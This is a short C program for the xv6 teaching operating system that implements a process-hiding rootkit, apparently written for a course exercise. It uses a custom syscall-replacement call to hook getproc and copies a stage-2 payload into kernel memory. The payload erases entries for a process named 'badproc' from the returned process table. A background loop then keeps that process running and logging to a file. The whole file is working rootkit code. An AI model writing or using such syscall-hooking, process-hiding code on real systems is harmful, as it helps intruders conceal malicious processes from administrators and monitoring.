#include "user.h"
#include "fcntl.h"
#include "proc.h"

int (*oldGetproc)(void*);

int exploitStage2() {
    int eip = 0;
    int retval;
    int (*realGetproc)(void);
    struct proctable *myptable;
    int i;
    /* int tmp; */

    // Grab our eip from eax
    asm("mov %%eax, %0" : "=r" (eip));
    realGetproc = (int(*)(void)) (*(int*)(eip - sizeof(int)));
    retval = realGetproc();

    myptable = *(struct proctable **)(proc->tf->esp + 4);

    for (i = 0; i < NPROC; ++i)
    {
        // This is stupid...
        if (
            myptable->proc[i].name[0] == 'b' &&
            myptable->proc[i].name[1] == 'a' &&
            myptable->proc[i].name[2] == 'd' &&
            myptable->proc[i].name[3] == 'p' &&
            myptable->proc[i].name[4] == 'r' &&
            myptable->proc[i].name[5] == 'o' &&
            myptable->proc[i].name[6] == 'c' &&
            myptable->proc[i].name[7] == '\0'
        )
        {
            myptable->proc[i].state = UNUSED;
            myptable->proc[i].pid = 0;
        }
    }

    return retval;
}

void* exploitStage1() {
    int *(*kalloc)(void);
    int *newpage;

    kalloc = (int*(*)())findkalloc();
    newpage = kalloc();
    *newpage = (int)oldGetproc;

    memmove(&newpage[1], &exploitStage2, 1024);

    return &newpage[1];
}

void injectRootkit() {
    struct proctable *dummy = 0;
    int newpage;
    sysreplace(23, (uint) &exploitStage1, (uint) &oldGetproc);
    newpage = getproc(dummy);
    sysreplace(23, (uint) newpage, (uint) &oldGetproc);
}

int main(int argc, char *argv[])
{
    int pid;
    int output;
    int curruptime;

    injectRootkit();

    if ((pid = fork()) > 0)
        exit();

    while(1)
    {
        curruptime = uptime();
        output = open("badproc.out", O_CREATE | O_WRONLY);
        printf(output, "%d\n", curruptime);
        close(output);
        sleep(1000);
    }
}
